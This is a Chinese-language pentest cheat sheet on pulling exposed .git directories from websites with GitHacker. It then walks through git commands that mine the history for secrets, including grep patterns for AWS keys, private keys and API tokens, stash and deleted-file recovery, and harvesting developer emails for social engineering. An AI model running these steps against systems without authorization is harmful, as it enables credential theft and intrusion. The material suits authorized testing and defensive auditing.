# GitHacker — .git 泄露利用 & 后期渗透

## 一、GitHacker 工具使用

### 安装

```bash
pip install GitHacker
```

### 常用参数

| 参数 | 作用 |
|------|------|
| `--url URL` | 目标 .git 地址，如 `http://example.com/.git/` |
| `--url-file FILE` | 批量目标文件，每行一个 URL |
| `--output-folder DIR` | 下载到本地目录 |
| `--brute` | 爆破分支/标签名（目录浏览关闭时使用） |
| `--threads N` | 线程数（默认多线程） |
| `--delay SEC` | 请求延迟秒数，防 WAF/频率限制 |

### 用法示例

```bash
# 基础下载
githacker --url http://target.com/.git/ --output-folder result

# 目录浏览关闭时加 --brute
githacker --brute --url http://target.com/.git/ --output-folder result

# Docker 运行（安全隔离，推荐）
docker run -v $(pwd)/result:/tmp/githacker/result wangyihang/githacker \
    --brute --output-folder /tmp/githacker/result --url http://target.com/.git/
```

---

## 二、获取 .git 后 — 渗透测试流程

拿到下载的仓库目录后，按以下步骤由浅入深挖掘敏感信息。

### 1. 概览情报

```bash
git log --oneline --all        # 快速浏览所有提交历史
git branch -a                  # 查看所有分支（含远程）
git tag                        # 查看标签（可能对应版本发布）
git stash list                 # 检查 stash（开发者暂存的代码，常含敏感信息）
git reflog                     # 引用日志（可能暴露被删除的分支/提交）
```

### 2. 敏感信息搜索（关键！）

**搜索历史中的所有提交：**

```bash
git grep -i "password\|secret\|token\|key\|credential" $(git rev-list --all)
git grep -i "api[_-]key\|api[_-]secret" $(git rev-list --all)
git grep -i "AKIA[0-9A-Z]\{16\}" $(git rev-list --all)          # AWS AK
git grep -i "BEGIN.*PRIVATE KEY" $(git rev-list --all)           # 私钥
git grep -i "sk-[a-zA-Z0-9]\{20,\}" $(git rev-list --all)       # OpenAI API Key
git grep -i "connectionString\|jdbc\|mongodb\|mysql" $(git rev-list --all)
```

**搜提交信息关键词：**

```bash
git log --all --oneline --grep="password\|secret\|fix\|vuln"
```

**搜索特定文件（如删除的文件）：**

```bash
git log --all --full-history -- **/secret*   # 搜索某个文件在历史中的记录
git log --diff-filter=D --summary           # 列出所有被删除的文件
```

### 3. Diff 分析变更

```bash
git show <commit-hash>                      # 查看某次提交的完整 diff
git show <commit-hash> --stat               # 只看改了哪些文件
git diff <commit1>..<commit2>               # 比较两个提交之间的差异
git log -p                                  # 查看每次提交的 diff
git log -S "password"                       # 找出引入/删除了特定字符串的提交
```

### 4. Stash 检查（高频敏感源）

```bash
git stash show -p                           # 查看最新 stash 完整内容
git stash show -p stash@{1}                 # 查看指定 stash
```

### 5. 恢复已删除文件

```bash
# 先找到删除文件的提交
git log --diff-filter=D --summary

# 从删除前的提交恢复
git checkout <commit-hash>^ -- <file-path>

# 查看文件最后一次存在的版本
git show <commit-hash>:<file-path>
```

### 6. 配置 & 凭据检查

```bash
git config --list                           # 可能暴露邮箱、Token 等
git config --global --list                  # 全局配置
```

检查以下常见敏感文件是否存在于源码中：

```
.env  .env.local  .env.production          # 环境变量
config.php  web.config  settings.py        # 框架配置
database.yml  application.properties       # 数据库配置
credentials.json  *.pem  *.key              # 云凭证/私钥
.git-credentials  .npmrc  .pypirc           # 包管理凭证
```

### 7. 底层对象检查

```bash
git fsck --lost-found                      # 找孤立/悬空对象（可能包含未被引用的数据）
git rev-list --objects --all                # 列出所有 Git 对象
git cat-file -p <object-hash>              # 查看任意对象内容
```

### 8. 开发者信息收集（社工）

```bash
git shortlog -sne                          # 统计提交次数 + 邮箱
git log --format='%an %ae' | sort -u       # 提取所有用户名和邮箱
```

---

## 三、快速流程（一句话版）

```
概览(log) → 搜敏感信息(grep) → 看stash → 扫分支/标签 → 
查reflog → 找删除文件 → fsck查悬空对象 → 检查配置文件
```

---

## 四、工具对比

| 功能 | GitHack | GitTools | dvcs-ripper | git-dumper | **GitHacker** |
|------|:-------:|:--------:|:-----------:|:----------:|:-------------:|
| 源文件 | Y | Y | Y | Y | **Y** |
| Reflog | N | Y | Y | Y | **Y** |
| Stash | N | N | N | Y | **Y** |
| 全部提交 | N | Y | Y | Y | **Y** |
| 分支 | N | N | N | Y | **Y** |
| 标签 | N | N | N | Y | **Y** |
| 远程信息 | N | Y | Y | Y | **Y** |
